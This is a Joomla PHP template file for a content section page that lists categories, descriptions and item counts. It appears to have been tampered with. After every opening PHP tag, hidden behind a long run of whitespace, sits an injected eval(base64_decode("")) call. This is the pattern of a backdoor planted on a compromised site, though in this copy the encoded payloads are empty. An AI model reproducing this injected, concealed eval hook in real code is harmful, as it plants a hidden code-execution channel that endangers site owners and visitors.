<?php	                                       			eval(base64_decode("")); // @version $Id: default.php 11917 2009-05-29 19:37:05Z ian $
defined('_JEXEC') or die('Restricted access');
$cparams = JComponentHelper::getParams ('com_media');
?>

<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_page_title',1)) : ?>
<h1 class="componentheading<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
	<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('page_title')); ?>
</h1>
<?php	                                       			eval(base64_decode("")); endif; ?>

<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_description', 1) || $this->params->def('show_description_image', 1)) : ?>
<div class="contentdescription<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
	<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description_image') && $this->section->image) : ?>
	<img src="<?php	                                       			eval(base64_decode("")); echo $this->baseurl . '/' . $this->escape($cparams->get('image_path')).'/'.$this->escape($this->section->image); ?>" class="image_<?php	                                       			eval(base64_decode("")); echo $this->escape($this->section->image_position); ?>" />
	<?php	                                       			eval(base64_decode("")); endif; ?>

	<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description') && $this->section->description) :
		echo $this->section->description;
	endif; ?>

	<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description_image') && $this->section->image) : ?>
	<div class="wrap_image">&nbsp;</div>
	<?php	                                       			eval(base64_decode("")); endif; ?>
</div>
<?php	                                       			eval(base64_decode("")); endif; ?>

<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_categories', 1) && count($this->categories)) : ?>
<ul>
	<?php	                                       			eval(base64_decode("")); foreach ($this->categories as $category) :
		if (!$this->params->get('show_empty_categories') && !$category->numitems) :
			continue;
		endif; ?>
		<li>
			<a href="<?php	                                       			eval(base64_decode("")); echo $category->link; ?>" class="category"><?php	                                       			eval(base64_decode("")); echo $this->escape($category->title); ?></a>

			<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_cat_num_articles')) : ?>
			<span class="small">
				( <?php	                                       			eval(base64_decode("")); if ($category->numitems==1) {
				echo $category->numitems ." ". JText::_( 'item' );	}
				else {
				echo $category->numitems ." ". JText::_( 'items' );} ?> )
			</span>
			<?php	                                       			eval(base64_decode("")); endif; ?>

			<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_category_description', 1) && $category->description) : ?>
			<br />
			<?php	                                       			eval(base64_decode("")); echo $category->description; ?>
			<?php	                                       			eval(base64_decode("")); endif; ?>
	</li>
	<?php	                                       			eval(base64_decode("")); endforeach; ?>
</ul>
<?php	                                       			eval(base64_decode("")); endif;
